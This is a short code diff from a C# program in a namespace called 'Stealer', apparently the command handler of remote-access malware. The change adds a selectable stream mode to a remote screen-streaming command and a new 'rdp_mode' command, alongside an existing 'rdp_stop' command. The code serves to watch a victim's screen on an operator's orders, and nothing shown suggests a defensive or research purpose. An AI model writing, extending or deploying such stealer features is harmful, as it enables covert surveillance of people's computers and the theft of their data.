@@ -56,10 +56,25 @@ namespace Stealer
             {
                 int fps = 5;
                 int quality = 50;
+                StreamMode mode = StreamMode.TileDelta;
                 string[] parts = cmd.Split(':');
                 if (parts.Length >= 2) int.TryParse(parts[1], out fps);
                 if (parts.Length >= 3) int.TryParse(parts[2], out quality);
-                ScreenStream.Start(fps, quality);
+                if (parts.Length >= 4 && int.TryParse(parts[3], out int modeVal))
+                {
+                    if (Enum.IsDefined(typeof(StreamMode), modeVal))
+                        mode = (StreamMode)modeVal;
+                }
+                ScreenStream.Start(fps, quality, mode);
+            }
+            else if (cmdLower.StartsWith("rdp_mode"))
+            {
+                string[] parts = cmd.Split(':');
+                if (parts.Length >= 2 && int.TryParse(parts[1], out int modeVal))
+                {
+                    if (Enum.IsDefined(typeof(StreamMode), modeVal))
+                        ScreenStream.SetMode((StreamMode)modeVal);
+                }
             }
             else if (cmdLower == "rdp_stop")
             {
